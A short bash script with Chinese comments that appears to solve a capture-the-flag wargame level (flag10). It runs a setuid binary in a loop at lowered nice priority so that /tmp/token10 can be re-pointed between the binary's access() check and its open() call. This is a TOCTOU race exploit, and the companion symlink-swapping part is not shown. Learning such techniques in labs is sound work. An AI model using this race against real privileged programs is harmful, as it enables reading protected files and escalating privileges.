#!/bin/bash

# nice -n 19 表示改变文件的执行优先级(nice值)，范围是 -20~19 数字越低，优先级越高
# 这里把flag10这个程序的优先级变低，这样就可以在access函数执行后，open函数执行前，有机会可以改掉/tmp/token10的指向了。
while true
do
    nice -n 19 /home/flag10/flag10 /tmp/token10 127.0.0.1
done
